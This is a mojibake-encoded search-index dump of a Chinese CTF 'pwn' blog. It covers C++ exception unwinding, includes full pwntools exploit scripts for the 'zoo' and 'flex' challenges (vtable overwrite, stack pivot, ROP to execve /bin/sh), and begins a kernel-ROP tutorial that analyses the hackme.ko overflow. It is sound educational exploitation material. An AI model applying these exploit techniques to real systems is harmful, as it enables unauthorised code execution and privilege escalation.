æ•è·å¼‚å¸¸å¹¶åšå¤„ç† é¦–å…ˆæ¾„æ¸…ä¸€ç‚¹ï¼Œè¿™é‡Œè¯´çš„ â€œC++ å‡½æ•°â€æ˜¯æŒ‡ï¼š è¯¥å‡½æ•°å¯èƒ½ä¼šç›´æ¥æˆ–é—´æ¥åœ°æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼šå³è¯¥å‡½æ•°çš„å®šä¹‰å­˜æ”¾åœ¨ä¸€ä¸ª C++ ç¼–è¯‘ï¼ˆè€Œä¸æ˜¯ä¼ ç»Ÿ Cï¼‰å•å…ƒå†…ï¼Œå¹¶ä¸”è¯¥å‡½æ•°æ²¡æœ‰ä½¿ç”¨â€œthrow()â€å¼‚å¸¸è¿‡æ»¤å™¨ã€‚ æˆ–è€…è¯¥å‡½æ•°çš„å®šä¹‰å†…ä½¿ç”¨äº† try å—ã€‚ ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:6:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#å¼‚å¸¸å¤„ç†"},{"categories":["Pwning"],"content":"Stack unwindå½“å¼‚å¸¸æŠ›å‡ºåï¼Œå°±ä¼šå»å¯»æ‰¾catchã€‚å¦‚æœåœ¨æœ¬å‡½æ•°ä¸­æ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¼šæ²¿ç€å‡½æ•°è°ƒç”¨é“¾å‘ä¸Šå¯»æ‰¾ï¼Œæœ€åæœ‰ä¸¤ç§ç»“æœï¼š æ‰¾åˆ°äº†catchï¼Œè®°å½•catchä½ç½®ï¼Œä»æŠ›å‡ºå¼‚å¸¸çš„å‡½æ•°å¼€å§‹æ¸…ç†æ ˆï¼Œç›´åˆ°åˆ°è¾¾catchæ‰€åœ¨å‡½æ•°ï¼Œè¿›å…¥catchçš„ä»£ç è¿›è¡Œå¤„ç† èµ°å®Œè°ƒç”¨é“¾éƒ½æ²¡æœ‰æ‰¾åˆ°ç›¸åº”çš„ catchï¼Œé‚£ä¹ˆè°ƒç”¨std::terminate()ï¼Œè¿™ä¸ªå‡½æ•°é»˜è®¤æŠŠç¨‹åº abort ç¨‹åºä¸­çš„ catch é‚£éƒ¨åˆ†ä»£ç æœ‰ä¸€ä¸ªä¸“é—¨çš„åå­—å«ä½œï¼šLanding padï¼ˆä¸ååˆ†å‡†ç¡®ï¼‰ï¼Œä»æŠ›å‡ºå¼‚å¸¸å¼€å§‹åˆ°æ‰§è¡Œ landing pad é‡Œçš„ä»£ç è¿™ä¸­é—´çš„æ•´ä¸ªè¿‡ç¨‹å«ä½œ stack unwind æºç å¦‚ä¸‹ï¼š extern \"C\" void __cxxabiv1::__cxa_throw (void *obj, std::type_info *tinfo, void (_GLIBCXX_CDTOR_CALLABI *dest) (void *)) { PROBE2 (throw, obj, tinfo); // Definitely a primary. __cxa_refcounted_exception *header = __get_refcounted_exception_header_from_obj (obj); header-\u003ereferenceCount = 1; header-\u003eexc.exceptionType = tinfo; header-\u003eexc.exceptionDestructor = dest; header-\u003eexc.unexpectedHandler = std::get_unexpected (); header-\u003eexc.terminateHandler = std::get_terminate (); __GXX_INIT_PRIMARY_EXCEPTION_CLASS(header-\u003eexc.unwindHeader.exception_class); header-\u003eexc.unwindHeader.exception_cleanup = __gxx_exception_cleanup; #ifdef _GLIBCXX_SJLJ_EXCEPTIONS _Unwind_SjLj_RaiseException (\u0026header-\u003eexc.unwindHeader); #else _Unwind_RaiseException (\u0026header-\u003eexc.unwindHeader); #endif // Some sort of unwinding error. Note that terminate is a handler. __cxa_begin_catch (\u0026header-\u003eexc.unwindHeader); std::terminate (); } æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯ï¼š è°ƒç”¨ __cxa_allocate_exception å‡½æ•°ï¼Œåˆ†é…ä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚ è°ƒç”¨ __cxa_throw å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†å¼‚å¸¸å¯¹è±¡åšä¸€äº›åˆå§‹åŒ–ã€‚ __cxa_throw() è°ƒç”¨ Itanium ABI é‡Œçš„ _Unwind_RaiseException() ä»è€Œå¼€å§‹ unwindã€‚ _Unwind_RaiseException() å¯¹è°ƒç”¨é“¾ä¸Šçš„å‡½æ•°è¿›è¡Œ unwind æ—¶ï¼Œè°ƒç”¨ personality routineã€‚ å¦‚æœè¯¥å¼‚å¸¸å¦‚èƒ½è¢«å¤„ç†(æœ‰ç›¸åº”çš„ catch)ï¼Œåˆ™ personality routine ä¼šä¾æ¬¡å¯¹è°ƒç”¨é“¾ä¸Šçš„å‡½æ•°è¿›è¡Œæ¸…ç†ã€‚ _Unwind_RaiseException() å°†æ§åˆ¶æƒè½¬åˆ°ç›¸åº”çš„catchä»£ç ã€‚ unwind å®Œæˆï¼Œç”¨æˆ·ä»£ç ç»§ç»­æ‰§è¡Œ Itanium ABI å®šä¹‰äº†ä¸€ç³»åˆ—å‡½æ•°åŠç›¸åº”çš„æ•°æ®ç»“æ„æ¥å»ºç«‹æ•´ä¸ªå¼‚å¸¸å¤„ç†çš„æµç¨‹åŠæ¡†æ¶ personality routine åˆ™ä¸»è¦è´Ÿè´£åšä¸¤ä»¶äº‹æƒ…ï¼š æ£€æŸ¥å½“å‰å‡½æ•°æ˜¯å¦å«æœ‰ç›¸åº” catch å¯ä»¥å¤„ç†ä¸Šé¢æŠ›å‡ºçš„å¼‚å¸¸ã€‚ æ¸…æ‰è°ƒç”¨æ ˆä¸Šçš„å±€éƒ¨å˜é‡ã€‚ è¿™é‡Œå°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç¨‹åºå¦‚ä½•ç¡®å®šå‡½æ•°ä¸­æ˜¯å¦æœ‰catchå‘¢ï¼Ÿ æ ¹æ®æˆ‘æŸ¥é˜…çš„èµ„æ–™ï¼Œç¼–è¯‘å™¨ä¼šå‘æ¯ä¸ªå‡½æ•°çš„æ ˆä¸­æ”¾å…¥ä¸€ä¸ªç»“æ„ä½“ï¼Œæ ˆä¸Šè¿™äº›ç»“æ„ä½“è¿æˆä¸€ä¸ªé“¾è¡¨ã€‚å…¶ä¸­åŒ…å«äº†æ ˆå›é€€æ‰€è¦çš„ä¸€äº›ä¿¡æ¯ã€‚æœ‰ä¸€ä¸ªnstepå­—æ®µï¼Œå®ƒæ ‡è¯†ç°åœ¨å›é€€çš„é˜¶æ®µã€‚try blockçš„å¼€å§‹ä¸ç»“å°¾ä¼šæœ‰ä¸€ä¸ªIDæ ‡è¯†ï¼Œå¦‚æœnstepåœ¨è¿™ä¸ªèŒƒå›´ï¼Œåˆ™è¯´æ˜å‡½æ•°ä¸­æœ‰catchå—ã€‚ ç„¶è€Œï¼Œåœ¨è°ƒè¯•æ—¶æˆ‘å‘ç°ç°åœ¨å¹¶æ²¡æœ‰è¿™ä¸ªç»“æ„ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥æ­£ç¡®æ•è·ã€‚æ ˆå›é€€ä¸å†ä»¥nstepä½œä¸ºæ ‡å¿—ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡è¿”å›åœ°å€ï¼Œå¦‚æœè¿”å›åœ°å€åœ¨æ‰€è®°å½•çš„try blockèŒƒå›´ï¼Œåˆ™åˆ¤å®šæœ‰catch blockã€‚è¿™ç®€åŒ–äº†æˆ‘ä»¬çš„åˆ©ç”¨ã€‚åªè¦ä¿è¯è¿”å›åœ°å€çš„èŒƒå›´å³å¯ç¡®ä¿è¢«æ•è·ã€‚ å…¶ä¸­æ›´å…·ä½“çš„ç»†èŠ‚ä¸å†è®¨è®ºã€‚ åœ¨é¢˜ç›®ä¸­ï¼Œé€šè¿‡å¼‚å¸¸å¤„ç†å¯ä»¥å¸®åŠ©ç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œä¸ºåˆ©ç”¨åšé“ºå«ã€‚ ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:6:1","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#stack-unwind"},{"categories":["Pwning"],"content":"Practiseï¼šzoochallenge link é¢˜ç›®æ˜¯ä¸€ä¸ªç®€å•çš„èœå•é¢˜ã€‚åœ¨nameèµ‹å€¼æ—¶ä½¿ç”¨çš„strcpyæ²¡æœ‰æ£€æŸ¥å¤§å°é€ æˆæº¢å‡ºï¼Œå¯ä»¥è¦†ç›–è™šè¡¨æŒ‡é’ˆã€‚ from pwn import * leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) binary = './zoo' libc = '/lib/x86_64-linux-gnu/libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] context(binary = binary, log_level='debug') p = process(binary) # p = remote('chall.pwnable.tw',10202) elf = ELF(binary) libc = ELF(libc) def cmd(i): p.sendlineafter('choice :',str(i)) def adddog(n,w): cmd(1) p.sendlineafter('Name : ',n) p.sendlineafter('Weight : ',w) def addcat(n,w): cmd(2) p.sendlineafter('Name : ',n) p.sendlineafter('Weight : ',w) def listen(n): cmd(3) p.sendlineafter('animal :',str(n)) def info(n): cmd(4) p.sendlineafter('animal :',str(n)) def dele(n): cmd(5) p.recvuntil('index of animal : ') p.sendline(str(n)) sc = asm(shellcraft.sh()) # 0x605420 p.sendline('a'*8+p64(0x605420+0x10)+sc) adddog('1'*0x8,'1') adddog('a'*0x8,'2') dele(0) # gdb.attach(p) adddog('n'*0x48+p64(0x605420+0x8),'2') listen(0) p.interactive() ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:7:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#practisezoo"},{"categories":["Pwning"],"content":"Practiseï¼šflexchallenge link åœ¨ç¬¬ä¸€ä¸ªé€‰é¡¹ä¸­ï¼Œå¯ä»¥åœ¨charset lengthå¤„è¾“å…¥ä¸€ä¸ªè´Ÿæ•°ï¼Œä»è€Œè¿›è¡Œæ ˆæº¢å‡ºã€‚å†è§¦å‘å¼‚å¸¸ï¼Œcatchä»£ç åœ¨ä¸Šå±‚å‡½æ•°ä¸­ã€‚catchå¤„ç†è¿‡åï¼Œåˆå›åˆ°äº†ä¸Šå±‚å‡½æ•°çš„è¿”å›å¤„ã€‚ å¯ä»¥é€šè¿‡æ ˆè¿ç§»ï¼Œåœ¨msgä¸­å†™å…¥ROPé“¾ã€‚å†é€šè¿‡æƒ³msgå†™æ•°æ®ï¼Œè®©å‡½æ•°è¿”å›åˆ°og from pwn import * leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) binary = './flex' libc = '/lib/x86_64-linux-gnu/libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] context(binary = binary, log_level='debug') p = process(binary) # p = remote('chall.pwnable.tw',10202) elf = ELF(binary) libc = ELF(libc) msg = 0x6061C0 pop_rdi = 0x00000000004044d3 readn = 0x4012D9 leave_ret = 0x0000000000400f1c p.sendlineafter('option:','1') p.sendlineafter('(yes/No)','No') p.sendlineafter('(yes/No)','yes') p.sendlineafter('length:','-2') # payload = 'a' payload = p64(msg)*37+p64(0x40150d) p.sendline(payload) gdb.attach(p) payload = p64(0)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(readn) p.sendlineafter('pattern:',payload) sleep(0.5) libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - libc.sym['puts'] og = libcbase + 0x10a41c p.sendline(p64(og)*0x6+p64(0x0)*10) p.interactive() ''' 0x4f3d5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL 0x4f432 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a41c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:8:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#practiseflex"},{"categories":["Pwning"],"content":"Kernel ROPå­¦ä¹ Linux kernel Pwnçš„ç¬¬ä¸€æ¬¡å°è¯•ï¼Œhxp2020: kernel-rop Thanks @Midas for so great tutorials ! ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:0:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#kernel-rop"},{"categories":["Pwning"],"content":"ç¯å¢ƒè®¾ç½®å°†é™„ä»¶è§£å‹å¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ï¼š initramfs.cpio.gzï¼šå‹ç¼©çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè¯¸å¦‚/binã€/etcâ€¦ éƒ½è¢«æ”¾å…¥è¿™é‡Œã€‚å…¶ä¸­ä¹Ÿå¯èƒ½åŒ…å«æœ‰æ¼æ´çš„æ¨¡å— vmlinuzï¼šå‹ç¼©çš„Linux kernelé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸­æå–å‡ºkernel ELFæ–‡ä»¶ã€‚ run.shï¼šè¿è¡Œkernelçš„shellè„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ›´æ”¹å†…æ ¸çš„å¯åŠ¨é€‰é¡¹ã€‚ä¸ºäº†æ­£å¸¸è¿è¡Œæˆ‘ä»¬éœ€è¦æå‰å®‰è£…qemuã€‚ å…¶ä»–æ–‡ä»¶Dockerfileã€ynetedç­‰éƒ½æ˜¯å¸®åŠ©æˆ‘ä»¬æ­å»ºæœ¬åœ°æœåŠ¡ç¯å¢ƒçš„ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#ç¯å¢ƒè®¾ç½®"},{"categories":["Pwning"],"content":"Kernel ./extract-image.sh ./vmlinuz \u003e vmlinux æå–å†…æ ¸ELFæ–‡ä»¶åˆ°vmlinuxã€‚ ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬è¦æå–kernelä¸­çš„gadgetï¼Œä½†æ˜¯ç”±äºkernelå¾ˆå¤§ï¼Œä½¿ç”¨ROPgadgetéœ€è¦å‡ åˆ†é’Ÿçš„æ—¶é—´ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æå‰å°†æ‰€æœ‰gadgetæ”¾å…¥æ–‡ä»¶ä¸­ã€‚ ROPgadget --binary ./vmlinux \u003e gadgets.txt è¿™å¯èƒ½éœ€è¦å¾ˆä¹…ã€‚å¯ä»¥ç”¨ropperï¼Œå¬è¯´ä¼šæ›´å¿«ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#kernel"},{"categories":["Pwning"],"content":"æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨è„šæœ¬å°†å…¶è§£å‹ mkdir initramfs cd initramfs cp ../initramfs.cpio.gz . gunzip ./initramfs.cpio.gz cpio -idm \u003c ./initramfs.cpio rm initramfs.cpio è§£å‹åçš„æ–‡ä»¶ç³»ç»Ÿåœ¨initramfsæ–‡ä»¶å¤¹ä¸­ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªhackme.koçš„é©±åŠ¨ã€‚å¾ˆæ˜æ˜¾æˆ‘ä»¬è¦åˆ©ç”¨å®ƒã€‚ è§£å‹æ–‡ä»¶ç³»ç»Ÿçš„å¦ä¸€ä¸ªç›®çš„æ˜¯æ›´æ”¹å…¶ä¸­çš„ä¸€äº›è®¾ç½®ï¼Œä¾¿äºæˆ‘ä»¬åœ¨åé¢å¯¹ä¸€äº›æ–‡ä»¶çš„è®¿é—®ã€‚åœ¨/etcçš„æ–‡ä»¶ä¸­ï¼Œæ‰¾åˆ°è¿™æ ·çš„å‘½ä»¤å¹¶ä¿®æ”¹å®ƒï¼Œæœ¬é¢˜ä¸­ä¸ºinittabæ–‡ä»¶ setuidgid 1000 /bin/sh # Modify it into the following setuidgid 0 /bin/sh åœ¨å®Œæˆåˆ©ç”¨åï¼Œæˆ‘ä»¬è¦æŠŠå®ƒåˆ‡æ¢å›1000 åœ¨ä¿®æ”¹å®Œæˆåæˆ‘ä»¬è¦å°†å…¶å‹ç¼©å›å»ï¼Œä½¿ç”¨compress.shï¼š gcc -o exploit -static $1 mv ./exploit ./initramfs cd initramfs find . -print0 \\ | cpio --null -ov --format=newc \\ | gzip -9 \u003e initramfs.cpio.gz mv ./initramfs.cpio.gz ../ å‰ä¸¤è¡Œæ˜¯ç¼–è¯‘æˆ‘ä»¬çš„expï¼ŒæŠŠå®ƒåŠ å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚ åœ¨å¾ˆå¤šæ•™ç¨‹ä¸­ï¼Œéƒ½ä½¿ç”¨äº†busyboxæ¨¡æ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚å¦‚æœé¢˜ç›®æä¾›äº†æ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ç§ç›´æ¥è§£å‹çš„æ–¹å¼ã€‚ä¸¤ç§æ–¹å¼æ‰€è¦è¾¾åˆ°çš„ç›®çš„æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‰ä¸ªäººä¹ æƒ¯é€‰æ‹©å³å¯ã€‚è„šæœ¬ç»è¿‡ä¿®æ”¹éƒ½æ˜¯é€šç”¨çš„ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#æ–‡ä»¶ç³»ç»Ÿ"},{"categories":["Pwning"],"content":"run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel vmlinuz \\ -initrd initramfs.cpio.gz \\ -hdb flag.txt \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \"console=ttyS0 kaslr kpti=1 quiet panic=1\" -mï¼šæŒ‡å®šå†…å­˜å¤§å°ï¼Œå¦‚æœä¸èƒ½å¯åŠ¨å¯ä»¥å°è¯•å¢åŠ å†…å­˜ -cpuï¼šæŒ‡å®šcpuçš„æ¨¡å¼ï¼Œ+smepå’Œ+smapæ˜¯ä¸€äº›ä¿æŠ¤æœºåˆ¶ -kernelï¼šæŒ‡å®šå†…æ ¸é•œåƒæ–‡ä»¶ -initrdï¼šæŒ‡å®šæ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶ -appendï¼šæŒ‡å®šå…¶ä»–ä¸€äº›å¯åŠ¨é€‰é¡¹ï¼ŒåŒ…æ‹¬ä¸€äº›ä¿æŠ¤æœºåˆ¶ åŠ å…¥-sé€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°çš„1234ç«¯å£è¿›è¡Œè°ƒè¯•ã€‚ $ gdb vmlinux (gdb) target remote localhost:1234 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#runsh"},{"categories":["Pwning"],"content":"How to debug kernelè°ƒè¯•å†…æ ¸ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªæ–­ç‚¹ã€‚ä½¿ç”¨lsmodå¯ä»¥åˆ—å‡ºæ‰€æœ‰åŠ è½½çš„æ¨¡å—ï¼ŒåŠå…¶åŸºå€ï¼ˆrootæƒé™ï¼‰ã€‚å¦‚æœæ²¡æœ‰æƒ³è¦çš„æ¨¡å—å¯ä»¥ä½¿ç”¨insmodåŠ è½½æŒ‡å®šçš„æ¨¡å—ã€‚ç”¨rmmodå¸è½½æŒ‡å®šæ¨¡å—ã€‚ ç»è¿‡IDAé™æ€åˆ†æä½¿ç”¨base + offsetçš„æ–¹å¼æ–­åœ¨æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ã€‚ä½†æ˜¯å†…æ ¸å¯¹è±¡å¾ˆç‰¹æ®Šï¼Œæˆ–è€…è¯´ç›®å‰çš„å·¥å…·å¯¹å†…æ ¸çš„è°ƒè¯•æ”¯æŒå¹¶ä¸æ˜¯ååˆ†å®Œç¾ã€‚å½“ç„¶ï¼Œwindbgå¯¹å†…æ ¸è°ƒè¯•çš„æ”¯æŒå¾ˆå¥½ã€‚æ‰€ä»¥ï¼Œä½ ä¸‹çš„æ–­ç‚¹æ˜¯å¾ˆæœ‰å¯èƒ½æœ‰æ–­ä¸ä¸‹æ¥çš„æƒ…å†µã€‚å¦å¤–ï¼Œå†…æ ¸åœ¨å•æ­¥è°ƒè¯•æ—¶ææœ‰å¯èƒ½å‡ºç°è·‘é£çš„ç°è±¡ï¼Œåœåœ¨ä¸€ä¸ªä½ ä¸çŸ¥é“çš„åœ°æ–¹ã€‚ä½¿ç”¨siå¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé¿å…è¿™æ ·ã€‚è€Œè¿™å°±è¦æ±‚æˆ‘ä»¬å¿…é¡»å°†æ–­ç‚¹ä¸‹çš„æ›´åŠ æœ‰é’ˆå¯¹æ€§ã€‚ gdbè¿˜æœ‰å¯èƒ½å°†å‡½æ•°åè¿›è¡Œé”™è¯¯è¯†åˆ«ï¼Œéƒ½æ˜¯æ­£å¸¸æƒ…å†µã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:4","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#how-to-debug-kernel"},{"categories":["Pwning"],"content":"Linux kernel ç¼“è§£æœºåˆ¶ Kernel stack cookiesï¼ˆcanaryï¼‰ï¼šå†…æ ¸æ ˆçš„canaryä¿æŠ¤ã€‚ Kernel address space layout randomizationï¼ˆKASLRï¼‰ï¼šå†…æ ¸åœ°å€éšæœºåŒ–ï¼›ä¸ç”¨æˆ·æ€çš„ASLRä¸€æ ·ï¼Œå°†å†…æ ¸åœ°å€éšæœºåŠ è½½ã€‚ Function Granular KASLRï¼š ä¸ç”¨æˆ·æ€ä¸åŒçš„æ˜¯ï¼Œå†…æ ¸æ€çš„å‡½æ•°ç›¸å¯¹äºåŸºå€çš„åç§»åœ¨åŠ è½½æ—¶ä¹Ÿè¢«éšæœºåŒ–äº†ã€‚åœ¨å¼€å¯FGKASLRåï¼Œå†…æ ¸æœ‰ä¸€å°éƒ¨åˆ†çš„æ•°æ®åç§»æ˜¯ç¡®å®šçš„ã€‚ ä¸ªäººç†è§£ï¼šè¦æƒ³å¯¹æ‰€æœ‰çš„æ•°æ®è¿›è¡Œå¦‚æ­¤å¼ºåº¦çš„éšæœºåŒ–æ˜¯ä¸å¯èƒ½çš„ï¼Œå†…æ ¸ä¹Ÿæ˜¯ç¨‹åºï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ€»æœ‰ä¸€äº›å…³äºåŠ è½½çš„æ•°æ®éœ€è¦è®¿é—®ï¼Œè¿™éƒ¨åˆ†æ•°æ®å¿…é¡»è¦è®©å†…æ ¸å‡†ç¡®çš„çŸ¥é“å…¶æ‰€åœ¨çš„åœ°å€ã€‚é‚£ä¹ˆï¼Œè¿™éƒ¨åˆ†æ•°æ®å°±æ˜¯ä¸èƒ½éšæœºåŒ–çš„ã€‚ Supervisor mode execution protectionï¼ˆSMEPï¼‰ï¼šå½“è¿›ç¨‹å±äºå†…æ ¸æ€æ—¶ï¼Œæ‰€æœ‰çš„ç”¨æˆ·ç©ºé—´çš„é¡µåœ¨é¡µè¡¨ä¸­éƒ½è¢«æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œã€‚åœ¨kernelä¸­ï¼Œé€šè¿‡å°†CR4å¯„å­˜å™¨çš„20th bitç½®ä½æ¥ä½¿èƒ½ã€‚åœ¨å¯åŠ¨æ—¶ï¼Œé€šè¿‡åœ¨-cpuä¸Š+smepæ¥å¯ç”¨ï¼Œåœ¨-appendçš„ä¸­åŠ å…¥nosmepæ¥ç¦ç”¨ã€‚ Supervisor Mode Access Prevention ï¼ˆSMAPï¼‰ï¼šSMEPçš„è¡¥å……ã€‚åœ¨å†…æ ¸æ€æ—¶ï¼Œç”¨æˆ·ç©ºé—´çš„ä»»ä½•é¡µé¢éƒ½æ˜¯ä¸å¯è®¿é—®çš„ã€‚åœ¨kernelä¸­ï¼Œé€šè¿‡å°†CR4å¯„å­˜å™¨çš„2th bitç½®ä½æ¥ä½¿èƒ½ã€‚åœ¨å¯åŠ¨æ—¶ï¼Œé€šè¿‡åœ¨-cpuä¸Š+smapæ¥å¯ç”¨ï¼Œåœ¨-appendçš„ä¸­åŠ å…¥nosmapæ¥ç¦ç”¨ã€‚ Kernel page-table isolationï¼ˆKPTIï¼‰ï¼šå½“è¿™ä¸ªæœºåˆ¶ä½¿èƒ½æ—¶ï¼Œå†…æ ¸å°†ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´çš„é¡µè¡¨å®Œå…¨åˆ†å¼€ã€‚æ­¤æ—¶ï¼Œå†…æ ¸æ€çš„é¡µè¡¨æ‹¥æœ‰å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´çš„é¡µï¼Œç”¨æˆ·æ€çš„é¡µè¡¨åŒ…å«äº†ç”¨æˆ·ç©ºé—´å’Œæœ€å°çš„å†…æ ¸ç©ºé—´ã€‚å®ƒå¯ä»¥é€šè¿‡åœ¨-appendé€‰é¡¹ä¸‹æ·»åŠ kpti=1æˆ–noptiæ¥å¯ç”¨/ç¦ç”¨ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:2:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#linux-kernel-ç¼“è§£æœºåˆ¶"},{"categories":["Pwning"],"content":"Kernel module: hackme.koå†…æ ¸æ¨¡å—ï¼ˆé©±åŠ¨ï¼‰ä¹Ÿæ˜¯ELFæ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨IDAä¸­è¿›è¡Œåˆ†æã€‚ init_moduleæ³¨å†Œäº†ä¸€ä¸ªåä¸ºhackmeçš„è®¾å¤‡ï¼ŒåŒ…å«ä»¥ä¸‹æ“ä½œï¼šhackme_readï¼Œhackme_writeï¼Œhackme_open å’Œ hackme_releaseã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡open(\"/dev/hackme\")æ¥ä¸ä¹‹äº¤äº’ï¼Œè°ƒç”¨å®ƒæ³¨å†Œçš„æ“ä½œã€‚ unsigned __int64 __fastcall hackme_read(__int64 a1, __int64 user_buf) { unsigned __int64 v2; // rdx unsigned __int64 size; // rbx bool v4; // zf unsigned __int64 result; // rax _QWORD buf[20]; // [rsp-A0h] [rbp-A0h] BYREF _fentry__(a1, user_buf); size = v2; // from 3rd arg buf[16] = __readgsqword(0x28u); _memcpy(\u0026hackme_buf, buf, v2); if ( size \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 4096LL); BUG(); } _check_object_size(\u0026hackme_buf, size, 1LL); v4 = copy_to_user(user_buf, \u0026hackme_buf, size) == 0; result = -14LL; if ( v4 ) result = size; return result; } unsigned __int64 __fastcall h_write(__int64 a1, __int64 user_buf, unsigned __int64 size) { char buf[128]; // [rsp+0h] [rbp-98h] BYREF unsigned __int64 v6; // [rsp+80h] [rbp-18h] v6 = __readgsqword(0x28u); if ( size \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 4096LL); BUG(); } _check_object_size(\u0026hackme_buf, size, 0LL); if ( copy_from_user(\u0026hackme_buf, user_buf, size) ) return -14LL; _memcpy(buf, \u0026hackme_buf, size); return size; } æ¼æ´å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥ä»å†…æ ¸æ ˆä¸Šè¯»å†™æœ€å¤š0x1000çš„æ•°æ®ï¼Œè¿™é€ æˆäº†æº¢å‡ºã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:3:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#kernel-module-hackmeko"},{"categories":["Pwning"],"content":"First stepï¼šret2usræˆ‘ä»¬ä»æœ€ç®€å•çš„å¼€å§‹å­¦ä¹ ï¼Œåœ¨ç”¨æˆ·æ€ï¼Œå½“ASLRå’ŒNXéƒ½å…³é—­æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°å¸¸ç”¨çš„åˆ©ç”¨æ–¹å¼ret2shellcodeã€‚åŒæ ·ï¼Œå½“å…³é—­å‡ ä¹æ‰€æœ‰çš„ä¿æŠ¤åæˆ‘ä»¬ä¹Ÿå¯ä»¥è¿”å›åˆ°è‡ªå·±å†™çš„ä»£ç ä¸­ã€‚è¿™ä¸ªè¿‡ç¨‹åœ¨å†…æ ¸æ€æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ï¼Œæ‰€ä»¥è¢«ç§°ä¸ºret2usrã€‚ åœ¨å¼€å§‹ä¹‹å‰ï¼Œä¿®æ”¹run.shé™¤å»+smepã€+smapã€kpti=1ã€kaslrå¹¶æ·»åŠ noptiå’Œnokaslrã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux 